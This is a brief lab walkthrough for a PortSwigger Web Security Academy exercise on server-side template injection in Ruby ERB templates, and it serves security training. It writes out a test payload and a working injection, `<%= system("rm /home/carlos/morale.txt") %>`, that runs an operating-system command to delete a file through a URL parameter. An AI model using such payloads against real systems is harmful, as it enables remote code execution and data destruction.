# Basic server-side template injection

## This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) due to the unsafe construction of an ERB template.

## To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

### HINT

### irb(main):007:0> system("mkdir testruby")

### => true

---

### step 1

use `<%= 7*7 %>`

eg `https://0a7800a803242fc88031d056005b0035.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`
it will print out of stock
`https://0a7800a803242fc88031d056005b0035.web-security-academy.net/?message=<%= 7*7 %>`
it will print 49

### step2

From the Ruby documentation, discover the `system()` method,
which can be used to execute arbitrary operating system commands.
`<%= system("rm /home/carlos/morale.txt") %>`
lab solve
